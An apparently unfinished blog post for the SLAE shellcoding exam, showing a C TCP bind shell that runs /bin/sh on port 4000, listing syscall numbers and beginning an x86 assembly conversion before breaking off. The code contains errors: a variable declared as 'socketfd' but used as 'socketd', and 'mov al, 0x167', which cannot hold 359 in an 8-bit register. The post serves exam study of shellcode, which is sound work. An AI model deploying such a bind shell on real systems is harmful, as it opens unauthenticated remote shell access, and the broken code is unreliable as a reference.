---
title: SLAE exam assignment 01
author: Stipe Marinovic
date: 2020-05-17 20:00:00 +0800
categories: [Blogging, Tutorial]
tags: [slae, shellcoding]
toc: true
---


... page still under construction ...  

# Assignment 01 #

* Create a Shell_Bind_TCP shellcode
  - Binds to a port
  - Execs Shell on incoming connection
* Port number should be easily configurable

# Syscalls #

To get idea how bind shell works and which syscalls are used, we can create bind shell code in C. After a bit of research, the simplest bind shell is following:
```
#define _GNU_SOURCE # added to avoid gcc's implicit declaration of function warning
#include <unistd.h> 
#include <stdio.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 

int main() { 

  // Define struct containing bind() arguments
  struct sockaddr_in server; 

  // Define socket file descriptor
  int socketfd; 
  int socketid; 
   
  // Create socket 
  socketd = socket(AF_INET, SOCK_STREAM, 6); 

  // Setup struct "server" containing following information: address, port and address family
  server.sin_addr.s_addr = htonl(INADDR_ANY); // any address (0.0.0.0)
  server.sin_port = htons(4000);              // port 4000
  server.sin_family = AF_INET;                // address family (ip v4)

  // Bind socket to ip 0.0.0.0, port 4000 
  bind(socketd, (struct sockaddr*) &server, sizeof(server)); 

  // Listen for incoming connections 
  listen(socketd, 2); 

  // Accept incoming connection 
  socketid = accept(socketd, NULL, NULL); 

  // Bind STDIN (0), STDOUT (1), STDERR (2) to incoming connection 
  dup2(socketid, 0); 
  dup2(socketid, 1); 
  dup2(socketid, 2); 

  // Run /bin/sh shell 
  execve("/bin/sh", NULL, NULL); 
} 
```

Compiled and run, we can confirm that bind shell is working.
!(bind shell)[../assets/img/slae_00001.png]

Based on prototype code above, we can conclude that following syscalls needs to be done in order to create bind shell:

* socket
* bind
* listen
* accept
* dup2
* execve

List of all syscalls and descriptions can be found in: unistd_32.h on following location: ```/usr/include/x86_64-linux-gnu/asm/unistd_32.h```

```
#define __NR_socket 359
#define __NR_socketcall 102
#define __NR_bind 361
#define __NR_listen 363
#define __NR_accept4 364
#define __NR_dup2 63
#define __NR_execve 11
```

# Converting C to Assembley #

First we need to figure out which arguments are needed for each syscall.  
Let's start with socket call. Based on man 2 pages (```man 2 socket```) we can see the descripton of function and arguments it takes.

```
int socket(int domain, int type, int protocol);
// socket()  creates an endpoint for communication and returns a file descriptor that refers to that endpoint.  
// The file descriptor returned by a successful call will be the lowest-numbered file descriptor not currently open for the process.
```

Arguments are passed via EAX, EBX, ECX, EDX, ESI, EDI registers.  
To have a clean start, registers need to be zero-out. Easiest way to do it (and avoid having null bytes in code) is by XOR register with itself.

```
xor eax, eax    ; Clear EAX 
xor ebx, ebx    ; Clear EBX
xor ecx, ecx    ; Clear ECX
xor edx, edx    ; Clear EDX
```

After that we need to pass syscall for socket in EAX register.

```mov al, 0x167 ; 359 (0x167) is the syscall for socket ```

Next, we need to pass arguments to ```socket(AF_INET, SOCK_STREAM, 6);``` function by placing arguments in registers:

```
mov bl, 2  ; domain = 2 (AF_INET/IPv4)
mov cl, 1  ; type = 1 (SOCK_STREAM/TCP)
mov dl, 6  ; protocol = 6 (IPPROTO_TCP)
int 0x80   ; syscall
```

.... to be continued ...


```
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
// When a socket is created with socket(2), it exists in a name space (address family) but has no address assigned to it.
// bind() assigns the address specified by addr to the socket referred to by the file descriptor sockfd.  
// addrlen specifies the size, in bytes, of the address structure pointed to by addr.
```

```
int listen(int sockfd, int backlog);
// listen() marks the socket referred to by sockfd as a passive socket, that is, as a socket that will be used to accept incoming connection requests using accept(2).
// The sockfd argument is a file descriptor that refers to a socket of type SOCK_STREAM or SOCK_SEQPACKET.
//  The backlog argument defines the maximum length to which the queue of pending connections for sockfd may grow.  
```

```
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
// The accept() system call is used with connection-based socket types (SOCK_STREAM, SOCK_SEQPACKET). 
// It extracts the first connection request on the queue of pending connections for the listening socket, sockfd, creates a new connected socket, and returns a new file descriptor referring to that socket.  
// The newly created socket is not in the listening state.  
```

```
int dup2(int oldfd, int newfd);
// The dup2() system call performs the same task as dup(), but instead of using the lowest-numbered unused file descriptor, it uses the file descriptor number specified in newfd.  If the file descriptor newfd was previously open, it is silently closed before being reused.
```

```
int execve(const char *pathname, char *const argv[], char *const envp[]);
// execve()  executes the program referred to by pathname.  
// This causes the program that is currently being run by the calling process to be replaced with a new program, with newly initialized stack, heap, and (initialized and uninitialized) data segments.
// pathname must be either a binary executable, or a script starting with a line of the form:
// #!interpreter [optional-arg]
```

